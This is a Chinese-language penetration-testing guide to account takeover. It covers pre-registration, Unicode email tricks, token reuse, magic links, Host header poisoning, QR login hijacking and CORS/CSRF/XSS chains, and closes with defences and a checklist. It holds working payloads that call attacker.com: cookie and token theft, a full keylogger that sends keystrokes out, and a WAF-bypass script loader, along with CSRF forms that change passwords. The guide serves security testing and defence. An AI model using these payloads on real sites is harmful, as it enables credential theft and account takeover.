---
attack_surface: [认证/授权绕过, 客户端利用, 信息泄露, 配置缺陷, 竞态/时序]
impact: [身份伪造, 机密性破坏, 完整性破坏, 信息泄露]
risk_level: 严重
prerequisites:
  - HTTP 协议与浏览器安全模型
  - Burp Suite 拦截代理操作
  - OAuth 2.0 / OIDC 协议理解
  - Unicode 规范化概念
related_techniques:
  - oauth-to-account-takeover
  - 2fa-otp-bypass
  - captcha-bypass
  - reset-password-bypass
  - cors-bypass
  - xss-cross-site-scripting
difficulty: 高级
tools:
  - Burp Suite (Turbo Intruder)
  - gau / waybackurls
  - Python (requests)
  - PostgreSQL / MySQL 客户端 (collation 测试)
---

# Account Takeover — 账户接管攻击全矩阵

> 关联文档：[OAuth to Account Takeover](./OAuth%20to%20Account%20Takeover.md) · [2FA/OTP Bypass](../2FA-OTP%20Bypass/README.md) · [Reset Password Bypass](../Reset%20Password%20Bypass/README.md) · [XSS](../../Reflected%20Values/XSS/README.md) · [CSRF](../../Reflected%20Values/CSRF/README.md) · [CORS Bypass](../../Reflected%20Values/CORS/README.md)

---

# 0x01 背景与分类

## 1.0 TL;DR

账户接管（Account Takeover, ATO）是 Web 安全中影响最大的漏洞类别之一——攻击者无需知晓受害者的密码即可获得对其账户的完全控制。现代 ATO 已从简单的暴力破解演化为多种精密攻击向量的组合：Unicode 规范化、令牌重用、Pre-ATO、跨设备 QR 登录劫持、OAuth 实现缺陷等。

## 1.1 ATO 攻击面全景

ATO 的本质是**认证状态机的逻辑缺陷**——服务端在身份验证流程中的一个或多个环节做出了错误假设：

| 假设 | 如何被打破 |
|------|----------|
| "邮箱是唯一且不可变的" | Unicode 规范化使多个地址映射到同一账户 |
| "重置令牌是一次性的" | 令牌可重用、可枚举、过期时间过长 |
| "OAuth 是安全的" | redirect_uri 验证缺陷、state 参数缺失 |
| "Cookie 会过期" | 旧 Cookie 在重新登录后仍然有效 |
| "设备信任是可靠的" | 设备 ID 通过批处理 API 泄露 |
| "跨设备登录是绑定 Session 的" | QR code 可在多个浏览器中使用 |

## 1.2 ATO 攻击矩阵

| 攻击向量 | 所需条件 | 技术难度 | 影响范围 |
|---------|---------|---------|---------|
| Pre-ATO（预注册） | 目标未注册 + OAuth 登录 | 低 | 单个账户 |
| Unicode 规范化 | 邮箱系统支持 Unicode | 中 | 可批量 |
| 重置令牌重用 | 令牌无一次性限制 | 低 | 可枚举 |
| QR/跨设备劫持 | 支持 QR 登录 | 中 | 单个会话 |
| 响应篡改 | JSON 响应中的布尔状态 | 低 | 单个账户 |
| 旧 Cookie 复用 | Cookie 在登出后未失效 | 低 | 单个账户 |
| CORS → ATO | CORS 配置错误 + 敏感 API | 高 | 可批量 |
| XSS → ATO | 任意 XSS | 中 | 可批量 |
| OAuth → ATO | redirect_uri 缺陷 / state 缺失 | 高 | 可批量 |
| 批处理 API 泄露 | 批处理 API + 设备 Cookie | 高 | 可批量 |

---

# 0x02 Pre-Account Takeover — 预注册攻击

## 2.1 原理

Pre-ATO 的核心概念是**时间窗口竞争**：攻击者在受害者之前创建账户，受害者后续通过 OAuth 或邮箱验证"确认"该账户时，攻击者可能保留访问权。

## 2.2 经典 Pre-ATO 模式

### 场景 A：无邮箱验证 + OAuth 关联

```
1. 攻击者使用 victim@example.com 注册账户
2. 平台不要求邮箱验证 → 账户创建成功（攻击者设置的密码）
3. 受害者稍后通过 Google OAuth 登录（同一邮箱）
4. 平台将 OAuth 身份关联到攻击者创建的账户
5. 攻击者仍可通过用户名/密码登录 → ATO
```

### 场景 B：OAuth 提供商不验证邮箱

```
1. 攻击者在 OAuth 提供商注册 victim@example.com（提供商不验证邮箱）
2. 受害者平台接受该 OAuth 提供商的邮箱声明为已验证
3. 攻击者通过 OAuth 登录受害者平台 → 直接以受害者身份登录
```

## 2.3 检测方法

```bash
# 1. 使用受害者邮箱注册（不验证）
curl -X POST https://target.com/register \
  -d "email=victim@example.com&password=attacker_pass"

# 2. 受害者通过 OAuth 登录

# 3. 攻击者尝试用密码登录
curl -X POST https://target.com/login \
  -d "email=victim@example.com&password=attacker_pass"
# 如果成功 → Pre-ATO 确认
```

---

# 0x03 邮箱/标识符操纵

## 3.1 Unicode 规范化攻击

### 原理

Unicode 规范化将视觉上相似或语义等价的字符映射到同一规范形式。当应用程序的验证逻辑、数据库排序规则（collation）和邮件系统之间对规范化的处理不一致时，攻击者可以注册一个 Unicode 变体地址来访问受害者账户。

### 攻击流程

```
1. 受害者账户: victim@gmail.com
2. 攻击者注册:   vićtim@gmail.com  (c + combining acute → ć)
3. 服务端 NFKC 规范化: vićtim → victim
4. 结果: 攻击者的账户映射到受害者记录 → ATO
```

### 攻击变体

| 攻击类型 | 示例 | 依赖条件 |
|---------|------|---------|
| 用户名 Unicode | `vićtim` → `victim` | 服务端规范化 |
| 域名 Unicode | `victim@gmáil.com` → `victim@gmail.com` | IDN 域名 + 邮件路由 |
| 第三方 IdP 不验证邮箱 | IdP 返回 `vićtim@company.com` | IdP 邮箱不验证 |
| 域名部分攻击 | `victim@ćompany.com` → 注册域名 | IdP 对域名部分规范化 |

### 测试方法

```python
# 常见 confusable 字符
confusables = {
    'a': 'áàâäãåāăą',  'c': 'ćĉċč',  'e': 'éèêëēĕėę',
    'i': 'íìîïīĭį',    'o': 'óòôöõōŏő', 'u': 'úùûüũūŭůűų',
    'n': 'ńņň',         's': 'śŝşš',   'y': 'ýÿŷ',
    'z': 'źżž',         'd': 'ďđ',      'l': 'ĺļľł',
    'g': 'ĝğġģ',        'k': 'ķĸ',      't': 'ţťŧ',
}

# 替换测试
email = "victim@gmail.com"
# 尝试将每个 ASCII 字母替换为 confusable 变体后用于注册
```

### 数据库 Collation 差异

不同系统对同一邮箱的解析可能不同：

| 场景 | 攻击者输入 | 数据库存储 | 结果 |
|------|----------|----------|------|
| 宽松 collation | `vićtim@gmail.com` | 匹配到 `victim@gmail.com` 行 | ATO |
| SMTP 路由到攻击者 | `victim@gmail.com` (Unicode 变体) | 邮件发到攻击者邮箱 | 令牌窃取 |
| IdP 返回未验证邮箱 | OAuth 返回 `vićtim@co.com` | 应用信任 IdP 返回的邮箱 | ATO |

```sql
-- 测试数据库 collation 行为
SELECT * FROM users WHERE email = 'vićtim@gmail.com' COLLATE utf8mb4_general_ci;
-- 如果返回 victim@gmail.com 的记录 → collation 漏洞确认

SELECT * FROM users WHERE email = 'victim@ģmail.com' COLLATE utf8mb4_unicode_ci;
-- 测试域名部分的 Unicode 处理
```

### 深度测试清单

1. 拦截忘记密码、邮箱变更、邀请流程，将受害者邮箱替换为 confusable/Unicode 变体
2. 如果有社交登录，对 IdP 回调中返回的邮箱执行相同的 Unicode 替换
3. 检查后端是使用**用户输入**的邮箱还是**数据库中的标准地址**来发送重置令牌

## 3.2 邮箱变更绕过验证

### 原理

部分应用在初始注册时验证邮箱，但在后续更改邮箱时不要求二次验证。

```
1. 攻击者注册 attacker@test.com → 验证邮箱
2. 攻击者在个人设置中将邮箱改为 victim@test.com
3. 平台未对邮箱变更进行二次验证
4. 现在 victim@test.com 关联到攻击者控制的账户
```

## 3.3 一键邮箱变更 ATO

来自 [实战报告](https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea)：

```http
# 1. 攻击者请求更改邮箱
POST /account/change-email HTTP/1.1
Cookie: session=ATTACKER_SESSION

new_email=victim@example.com

# 2. 攻击者收到确认链接
# 3. 攻击者发送此链接给受害者
# 4. 受害者点击链接 → 邮箱被改为攻击者的邮箱
# 5. 攻击者通过"忘记密码"重置 → ATO 完成
```

---

# 0x04 令牌与链接利用

## 4.1 重置令牌重用

### 原理

如果密码重置令牌在首次使用后未被标记为已使用，攻击者可以通过工具收集历史令牌并重放。

### 检测方法

```bash
# 使用 gau/waybackurls 收集历史重置链接
echo "target.com" | gau | grep -i "reset\|token\|recover\|forgot" > reset_urls.txt

# 逐一测试这些令牌
while read url; do
  curl -v "$url" 2>&1 | grep -E "HTTP/|Location:"
done < reset_urls.txt
```

### 令牌验证清单

```bash
# 单一使用测试
# Step 1: 使用令牌
curl "https://target.com/reset?token=abc123" -d "password=newpass"

# Step 2: 再次使用同一令牌
curl "https://target.com/reset?token=abc123" -d "password=newpass2"
# 如果第二次成功 → 令牌重用漏洞

# 跨设备/浏览器测试
# 在浏览器 A 和浏览器 B 中同时打开同一重置链接

# 邮箱变更后测试
# 1. 使用令牌重置密码
# 2. 将邮箱改为 attacker@test.com
# 3. 再次使用同一令牌 → 是否仍然有效？
```

## 4.2 Magic Links / Passwordless Login

### 原理

免密登录链接与重置令牌有相同的安全要求：一次性使用、短期有效、绑定到请求时的浏览器/Session。

Magic Link 安全的核心悖论是：**认证安全性 = 邮箱提供商安全性**。如果攻击者能访问受害者的邮箱，Magic Link 就是直接的 ATO 通道。因此 Magic Link 实现必须做到邮箱泄露也无法利用。

### 关键攻击面：signup+login 合并端点

最危险的 Magic Link 实现模式是将**注册和登录合并到同一未认证端点**：

```
POST /api/auth/magic-link
→ 如果邮箱已存在 → 发送登录链接
→ 如果邮箱不存在 → 静默创建账户 + 发送登录链接
```

这使得 Pre-ATO 变得极其简单——攻击者不需要预先手动注册，只需用受害者邮箱请求 Magic Link 即可触发账户创建。如果后续受害者通过 OAuth 关联同一邮箱，攻击者的密码/会话仍然有效。

防御：Magic Link 端点只对已存在且已验证邮箱的用户发送链接；注册和登录使用独立端点。

### 攻击面

```http
# redirect_url 参数注入
POST /api/auth/magic-link HTTP/1.1
Host: target.tld
Content-Type: application/json

{"email":"victim@target.tld","redirect_url":"https://attacker.tld/callback"}
```

测试清单：

1. 接受 `redirect_url` / `next` / `return_to` / `callback` 参数 → 将受害者重定向到攻击者控制的页面
2. 确认端点将令牌放在 URL / hash / 浏览器可读响应中 → 攻击者的着陆页窃取令牌
3. 移动端深度链接（自定义 scheme / App Link / Universal Link）→ 恶意 App 注册相同的 handler 拦截令牌
4. 同一链接在 2 个浏览器 / 2 个配置文件中打开 → 链接是否浏览器绑定？
5. Webmail vs 原生邮件 App vs 浏览器内打开 → 是否有上下文绑定？
6. 端点是否在未认证状态下同时执行注册+登录？→ Pre-ATO 的直接入口

```http
# 典型攻击 Payload
POST /api/auth/magic-link HTTP/1.1
Host: target.tld

email=victim@target.tld&redirect_url=https://attacker.tld/callback
# → 受害者点击后 → 浏览器跳转到 attacker.tld/callback?token=<VICTIM_TOKEN>
```

## 4.3 安全问题的 username 参数覆盖

### 原理

如果"更新安全问题"流程在已认证用户的基础上接受一个 `username` 参数来指定目标用户，攻击者可以覆盖任意用户的安全问题答案。

```http
POST /reset.php HTTP/1.1
Host: target.com
Cookie: PHPSESSID=<low-priv-user>
Content-Type: application/x-www-form-urlencoded

username=admin&new_answer1=A&new_answer2=B&new_answer3=C
```

攻击流程：
1. 使用低权限 Throwaway 账户登录，捕获 Session Cookie
2. 提交受害者用户名 + 新安全问题答案
3. 通过安全问题登录流程认证 → 获得受害者权限

---

# 0x05 Session 与 Cookie 攻击

## 5.1 旧 Cookie 复用

### 原理

如[这篇报告](https://medium.com/@niraj1mahajan/uncovering-the-hidden-vulnerability-how-i-found-an-authentication-bypass-on-shopifys-exchange-cc2729ea31a9)所述，登出后旧的认证 Cookie 可能仍然有效。

```bash
# 测试流程
# 1. 登录账户 → 保存所有 Cookie
# 2. 登出
# 3. 重新登录（获取新 Cookie）
# 4. 使用步骤 1 保存的旧 Cookie 发起请求
curl -X GET https://target.com/dashboard \
  -H "Cookie: <OLD_COOKIES_FROM_STEP_1>"
# 如果成功 → 旧 Cookie 复用漏洞
```

## 5.2 受信任设备 Cookie + 批处理 API 泄露

### 原理

这是[一条复杂的攻击链](https://ysamm.com/uncategorized/2026/01/15/steal-dtsg-cookie.html)：长期有效的设备标识 Cookie（`SameSite=None`）用于放宽账户恢复检查。批处理 API 允许跨子请求引用 JSON 路径，将本不可读的 OAuth 响应中的数据复制到攻击者可读的 writable sink。

```http
POST https://graph.facebook.com/
batch=[
  {"method":"post","omit_response_on_success":0,
   "relative_url":"/oauth/access_token?client_id=APP_ID&redirect_uri=REDIRECT_URI",
   "body":"code=SINGLE_USE_CODE","name":"leaker"},
  {"method":"post","relative_url":"PAGE_ID/posts",
   "body":"message={result=leaker:$ .machine_id}"}
]
access_token=PAGE_ACCESS_TOKEN&method=post
```

攻击链：
1. 识别长期设备 Cookie → `SameSite=None`
2. 找到返回设备 ID 的端点（但跨域不可读）
3. 批处理 API 允许 JSON 路径引用（`{result=name:$ .path}`）→ 将 OAuth 响应中的 `machine_id` 写入攻击者可读的帖子
4. 在隐藏 `<iframe>` 中加载批处理 URL → 受害者发送设备 Cookie → 设备 ID 泄露
5. 重放：设置被盗设备 Cookie 到新 Session → 绕过恢复检查

---

# 0x06 响应与参数操纵

## 6.1 响应状态篡改

### 原理

认证响应简化为布尔状态时，直接修改响应码和 body 可能绕过验证。

```http
# 攻击 1: 修改 HTTP 状态码
HTTP/1.1 401 Unauthorized → HTTP/1.1 200 OK

# 攻击 2: 修改 JSON body
{"success": false, "message": "Invalid credentials"}
→
{"success": true, "message": "Welcome"}

# 攻击 3: 清空 body
{"error": "Invalid token"}
→
{}
```

## 6.2 Host Header 注入 → 密码重置劫持

### 攻击流程

```http
# Step 1: 发起密码重置
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-For: attacker.com

email=victim@target.com

# Step 2: 服务端生成重置链接时使用攻击者控制的 Host
# → 重置邮件中的链接: https://attacker.com/reset?token=xxx

# Step 3: 攻击者收到 token → ATO
```

### 变体

```http
# 同时修改多个 Header
POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com
Referer: https://attacker.com
Origin: https://attacker.com

email=victim@target.com

# 重新发送重置邮件（部分系统允许重新发送）
POST /forgot-password/resend HTTP/1.1
Host: attacker.com
```

---

# 0x07 跨域攻击链（CORS / CSRF / XSS → ATO）

## 7.1 CORS 错误配置 → ATO

如果页面存在 CORS 错误配置，可以通过跨域请求窃取敏感信息或触发状态更改操作：

```javascript
// 利用 CORS 读取受害者敏感信息
fetch("https://target.com/api/user/profile", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  // 窃取 email / phone / api_key
  fetch("https://attacker.com/steal?data=" + JSON.stringify(data));
});
```

## 7.2 CSRF → ATO

```html
<!-- CSRF 修改密码 -->
<form action="https://target.com/change-password" method="POST" id="csrf">
  <input name="new_password" value="attacker_pass">
  <input name="confirm_password" value="attacker_pass">
</form>
<script>document.getElementById("csrf").submit();</script>

<!-- CSRF 修改邮箱 -->
<form action="https://target.com/change-email" method="POST" id="csrf">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.getElementById("csrf").submit();</script>
```

## 7.3 XSS → ATO

```javascript
// 窃取 Session Cookie
new Image().src = "https://attacker.com/steal?c=" + document.cookie;

// 窃取 localStorage token
new Image().src = "https://attacker.com/steal?t=" + localStorage.getItem("auth_token");

// 属性注入型 XSS — 在登录页 hook 键盘事件窃取凭据
// <img src=x onerror="document.onkeypress=function(e){new Image().src='https://attacker.com/k?k='+e.key}">
```

### 核心洞察：登录页 XSS 的价值

登录页本身即是敏感功能——用户在此输入凭据。即使无法窃取已认证 Session，仍可通过 Keylogger 窃取凭据实现 ATO。

### WAF 绕过：多语句分割技术

部分 WAF 仅检查 `onfocus` / `onclick` 等事件处理器中的**第一个 JavaScript 语句**。利用分号分割，可在第二个语句中注入恶意代码：

```html
<!-- WAF 只检查第一句（无害），放行第二句（恶意） -->
<a href="#" onfocus="var x=1;$.getScript(String.fromCharCode(104,116,116,112,...)),function(){}" id="forgot_btn">
```

`String.fromCharCode()` 构造函数——当 WAF 同时过滤引号时，用字符码数组构造 URL 字符串，绕过引号限制。

### 自动执行：onfocus + hash fragment

`onfocus` + URL hash `#element_id` 使 payload 在页面加载时自动触发（无需用户点击）：

```
https://target.com/login?service=PAYLOAD#forgot_btn
→ 页面加载 → 浏览器自动聚焦 #forgot_btn 元素 → onfocus 触发 → XSS 执行
```

### 外部 Keylogger 导入

```javascript
// keylogger.js — 托管在攻击者服务器
var keys='';
document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys.length>0) {
        new Image().src = 'https://attacker.com/steal?c='+keys;
        keys = '';
    }
}, 1000);

// 注入 payload（通过 $.getScript 导入）
// onfocus="var x=1;$.getScript(String.fromCharCode(...)),function(){}" id="forgot_btn"
```

### 防御缺失的典型标志

属性型 XSS → Keylogger → ATO 链之所以可行，通常因为：
- **无 CSP** 或 CSP 允许 `unsafe-inline` / 未限制 `script-src`
- **WAF 仅检查首句 JS** — 正确做法是分析整个属性值
- **输出编码不足** — `"` 字符未被正确转义，允许属性闭合

## 7.4 Same Origin + Cookie Fixation

如果有受限 XSS 或子域名接管，可以利用同源 Cookie 操作：

```javascript
// Cookie Fixation → 将受害者 Session 固定为攻击者已知值
document.cookie = "session=ATTACKER_KNOWN_SESSION; domain=.target.com; path=/";
```

---

# 0x08 QR / 跨设备登录劫持

## 8.1 攻击面

桌面端 QR 登录、TV/设备码登录、钱包登录、"手机上批准"流程是现代 ATO 的新兴攻击面。

### 核心弱点

| 弱点 | 描述 | 测试方法 |
|------|------|---------|
| **未绑定浏览器 Session** | 批准流程认证了不同于创建 QR 的浏览器 | 在浏览器 A 创建 QR → 在手机批准 → 浏览器 B 获得登录态 |
| **可重用 QR/设备码** | 同一 code 可认证多个浏览器 | 用同一 QR 扫描 → 两个浏览器都获得登录 |
| **可预测/攻击者可控的标识符** | 短/顺序/客户端生成的 `qrId` | 暴力枚举或替换为攻击者控制的 code |
| **弱批准上下文** | 移动端不显示足够来源/设备/操作信息 | 钓鱼式同意欺骗 |

### 测试工作流

```
1. 在攻击者浏览器中启始流程 → 捕获轮询/状态端点
2. 从第二个浏览器重用同一 qrId/device_code
3. 在两个账户之间交换浏览器/Session 标识符 — 
   批准是否跟随 code 而非原始 Session？
4. 尝试并行轮询/竞态 + 短 QR 标识符暴力枚举
5. 如果支持钱包/passkey 跨设备登录 — 
   验证 QR/设备码过期或已在错误上下文中使用时是否拒绝
```

---

# 0x09 防御策略

## 9.1 根本原则

| 错误做法 | 正确做法 |
|---------|---------|
| 邮箱作为唯一账户标识符 | 使用不可变的内部 ID + 邮箱仅作为通信渠道 |
| 信任客户端传来的状态参数 | 服务端独立维护认证状态机，不信任客户端状态 |
| Unicode 邮箱直接比较 | 使用 NFKC 规范化 + 检查 confusable 字符 |
| 令牌可多次使用 | 一次性令牌 + 使用后立即失效 + 撤销关联令牌 |
| 依赖 Cookie 过期时间 | 服务端维护令牌黑名单，登出时主动撤销 |
| QR code 无 Session 绑定 | 生成时绑定浏览器 Session + 一次性使用 + 短 TTL |
| 密码重置不考虑 Host Header 安全 | 使用配置文件中的 canonical URL，忽略请求头中的 Host |
| 邮件变更无需二次验证 | 变更邮箱时要求密码确认 + 向新旧邮箱都发送通知 |

## 9.2 关键防御措施

1. **令牌一次性使用** — 重置令牌和 Magic Link 使用后立即失效，并发请求中互斥
2. **NFKC 规范化 + confusable 检测** — 注册时对邮箱进行 Unicode 规范化，检测 confusable 字符
3. **Session 绑定 QR/设备码** — QR 码绑定到创建它的浏览器 Session，批准后原 Session 失效
4. **邮箱变更双确认** — 向旧邮箱和新邮箱都发送确认，要求密码验证
5. **防止令牌泄露** — 令牌不在 URL 中（使用 POST body）、设置短 TTL（< 5 分钟）
6. **服务端状态机强制** — 每个认证步骤验证前置条件，拒绝跳跃访问
7. **OAuth state 参数强制** — 拒绝缺少 state 或 state 值不匹配的回调（详见 OAuth 附属文档）
8. **Passkey/WebAuthn** — 部署抗钓鱼的 FIDO2 凭据作为主要或第二因素认证

## 9.3 ATO 安全测试清单

- [ ] 是否可以使用受害者邮箱预注册账户？
- [ ] 邮箱变更是否需要二次验证？
- [ ] Unicode confusable 字符是否可以创建伪装账户？
- [ ] 重置令牌是否可以重用或长期有效？
- [ ] Magic Link 中的 redirect_url 是否可被操纵？
- [ ] 安全问题是否能被低权限用户覆盖？
- [ ] 登出后旧 Cookie 是否仍然有效？
- [ ] 设备信任 Cookie 是否可以通过批处理 API 泄露？
- [ ] 响应篡改（状态码/Body 修改）是否能绕过认证？
- [ ] Host Header 操纵是否能劫持密码重置？
- [ ] QR 登录 code 是否可在多浏览器中重用？
- [ ] CORS/CSRF/XSS 是否能链式导致 ATO？
- [ ] OAuth redirect_uri 是否有验证缺陷？（详见附属文档）

---

## 参考资料

- [HackTricks — Account Takeover](https://book.hacktricks.wiki/en/pentesting-web/account-takeover.html)
- [One Click Account Takeover](https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea)
- [Unicode Normalization Attack Talk (YouTube)](https://www.youtube.com/watch?v=CiIyaZ3x49c)
- [8 Account Takeover Methods](https://infosecwriteups.com/firing-8-account-takeover-methods-77e892099050)
- [0xdf — HTB Era: security-question IDOR](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [Steal DATR Cookie via Batch API](https://ysamm.com/uncategorized/2026/01/15/steal-dtsg-cookie.html)
- [The Magic Link Vulnerability (Dfns)](https://www.dfns.co/article/the-magic-link-vulnerability)
- [USENIX Security 2025 — QR Code-based Login Security](https://www.usenix.org/conference/usenixsecurity25/presentation/zhang-xin)
- [Attribute-only XSS behind WAFs → ATO](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
